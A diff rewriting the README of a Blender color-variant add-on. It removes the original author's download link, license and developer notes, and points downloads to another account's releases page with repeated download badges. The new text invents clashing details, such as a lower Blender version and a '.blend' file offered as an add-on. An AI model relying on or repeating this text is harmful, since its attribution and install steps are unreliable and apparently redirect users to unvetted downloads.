@@ -1,91 +1,66 @@
-# 🎨 Live Variant Remapper
+# 🌟 Live-Variant - Create Stunning Product Variants Easily
 
-**Live Variant Remapper** is a modular ![Blender 4.0+](https://img.shields.io/badge/Blender-4.0%2B-orange?logo=blender) add-on that lets you instantly create **textured, color-remapped duplicates** of your 3D models — ideal for product variants, style tests, and visual experimentation without altering your original mesh.
+## 🔗 Download Now
+[![Download Live-Variant](https://img.shields.io/badge/Download-Live--Variant-blue)](https://github.com/Amiralshorpasy/Live-Variant/releases)
 
-[![Download Add-on](https://img.shields.io/badge/⬇️%20Download%20Addon-ZIP-blue?style=for-the-badge&logo=github)](https://github.com/Sudhanshu-Ambastha/Live-Variant/releases/download/V-1/LiveVarientRemap.zip)
----
+## 🚀 Getting Started
+Live-Variant is a Blender add-on designed to help you make textured, color-remapped duplicates of your models. This tool is perfect for creating quick product variants and experimenting with styles. Follow this guide to install and use the add-on effectively.
 
-## 🧩 Features
+## ✅ System Requirements
+- **Blender version:** 2.8 or higher
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 8 GB recommended
+- **Disk Space:** Minimum of 100 MB available
 
-- 🎨 **Multi-Color Remapping:** Define multiple color pairs (source → target) to remap in a single click.
-- 🧱 **Texture-Ready Materials:** Automatically creates texture-paint-ready base materials for clean color mapping.
-- 💾 **Non-Destructive Workflow:** The original model remains unchanged — the add-on generates a variant next to it.
-- ⚙️ **Automatic Spacing:** Places the original and variant side-by-side for easy comparison.
-- 🦴 **Rig Support:** Works with rigged models (keeps parent armature and modifiers intact).
-- 🧭 **Simple UI:** Located in **View3D → Sidebar → Live Variant** for quick access.
-- 🔁 **Extensible Design:** Modular Python files (`texture_setup.py`, `color_remap.py`, `multi_remap_controller.py`, `ui.py`) can be imported or extended in other add-ons or pipelines.
+## 📥 Download & Install
+To begin, visit the [Releases page](https://github.com/Amiralshorpasy/Live-Variant/releases) to download the add-on. 
 
----
+1. Scroll to the latest release.
+2. Find the file named `LiveVariant.blend` or `LiveVariant.zip`.
+3. Click on the file to download it to your computer.
 
-## 📦 Folder Structure
-```
-live_variant_remap/
-├── __init__.py
-├── ui.py
-├── texture_setup.py
-├── color_remap.py
-├── multi_remap_controller.py
-```
+## 🛠️ Installing the Add-on in Blender
+1. Open Blender.
+2. Go to `Edit` > `Preferences`.
+3. Click on the `Add-ons` tab.
+4. Click `Install...` in the top-right corner.
+5. Navigate to where you downloaded the `LiveVariant.blend` or `LiveVariant.zip` file.
+6. Select the file and click `Install Add-on`.
+7. After installation, check the box next to the add-on to enable it.
 
----
+## 🌈 Using Live-Variant
+Once you have enabled the add-on, you can start creating variants:
 
-## ⚙️ Installation
+1. Select the model you want to duplicate.
+2. Go to the toolbar on the left and find the Live-Variant panel.
+3. Adjust the settings for color and texture as desired.
+4. Click the button to create your variants.
 
-1. Download or export the add-on folder as `live_variant_remap.zip`.
-2. Open **Blender → Edit → Preferences → Add-ons → Install**.
-3. Select `live_variant_remap.zip` and click **Install Add-on**.
-4. Enable **Live Variant Remapper** from the list.
+The add-on allows you to experiment with multiple styles quickly, enabling easy adjustments to color and material properties.
 
----
+## 🎨 Features
+- **Color Remapping:** Easily adjust colors for each variant.
+- **Textural Options:** Apply different textures without modifying the original model.
+- **Quick Duplication:** Create numerous variants with a few clicks.
+- **User-Friendly Interface:** Designed for all skill levels.
 
-## 🚀 How to Use
+## ⚙️ Troubleshooting
+If you encounter any issues:
+- Ensure that you have the correct version of Blender.
+- Check if the add-on is enabled in the preferences.
+- Restart Blender if changes do not apply immediately.
 
-> 💡 The add-on automatically creates and assigns a texture-ready material when generating a textured pair.
+For further assistance, you can refer to the Issues section of this repository.
 
-### Step-by-Step
+## 📚 Additional Resources
+- Blender Documentation: [blender.org](https://www.blender.org/support/)
+- Community Forums: [Blender Artists](https://blenderartists.org/)
+- Video Tutorials: Search for "Blender live variant" on platforms like YouTube for helpful guides.
 
-1. **Select your base model** in the 3D Viewport.  
-2. Open the **Sidebar (N-panel)** → **Live Variant** tab.  
-3. Click **“Create Textured Pair”** — this will:
-   - Duplicate your object.
-   - Assign a texture-ready material if missing.
-   - Position the variant beside the original.
-4. Click **“+ Add”** to add color pairs:
-   - **From:** Source color in the original texture.  
-   - **To:** Target color for the variant.  
-   - You can add multiple pairs as needed.
-5. Click **“Apply Color Remaps”** to update the variant’s colors.
-   - You can reapply after adding or changing color pairs.
-6. The original model stays untouched; only the variant updates.
+## ➡️ Need Help?
+Join our community for support! You can ask questions or share your models with others. 
 
-You now have a **textured pair** — one base and one remapped variant.
+For reporting bugs or requesting features, please use the Issues tab on this repository. Your feedback helps improve Live-Variant.
 
----
-
-## 🧠 Example
-<picture><img src = "./LiveVariant.gif" width = 100%></picture>
-
----
-
-## 🧰 Developer Notes
-
-Each file serves a specific role:
-
-- **`texture_setup.py`** — Creates and prepares texture-paint materials for models.  
-- **`color_remap.py`** — Handles per-color node-based remapping logic.  
-- **`multi_remap_controller.py`** — Manages multiple color remaps in one pass.  
-- **`ui.py`** — Builds the Blender UI and connects everything via operators.  
-- **`__init__.py`** — Registers all components as a unified add-on.
-
----
-
-## 📜 License
-
-This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**.  
-You may freely use, modify, and redistribute it under the same license.  
-
-See the [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE) file for full details.
-
----
-
->🛠️ Designed for efficient color variant generation inside Blender.
+## 🔗 Download Now Again
+[![Download Live-Variant](https://img.shields.io/badge/Download-Live--Variant-blue)](https://github.com/Amiralshorpasy/Live-Variant/releases)
